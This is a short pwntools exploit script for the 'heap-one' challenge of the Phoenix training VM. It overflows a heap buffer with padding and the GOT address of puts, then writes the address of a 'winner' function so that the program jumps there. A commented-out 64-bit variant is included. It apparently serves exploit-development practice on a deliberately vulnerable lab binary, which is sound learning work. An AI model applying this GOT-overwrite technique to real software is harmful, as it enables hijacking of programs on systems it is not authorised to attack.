#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(terminal=['tmux','new-window'])
# exe = context.binary = ELF('heap-one_64')
exe = context.binary = ELF('heap-one_32')

host = args.HOST or 'localhost'
port = int(args.PORT or 2222)
user = args.USER or 'user'
password = args.PASSWORD or 'user'
# remote_path = '/opt/phoenix/amd64/heap-one'
remote_path = '/opt/phoenix/i486/heap-one'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *(main+131)
b *(main+158)
continue
'''.format(**locals())

# -- Exploit goes here --

# 64 bits, null bytes in argv...
# there = exe.got['printf']
# that = exe.symbols['winner']
# arg1 = b'A'*40
# arg1 += pack(there,word_size=24)
# arg2 = pack(that,word_size=24)

# 32 bits, no null bytes in argv
there = exe.got['puts']
that = exe.symbols['winner']
arg1 = b'A'*20
arg1 += p32(there)
arg2 = p32(that)


io = start(argv=[arg1,arg2])
info(io.recvall().decode())

# io.interactive()

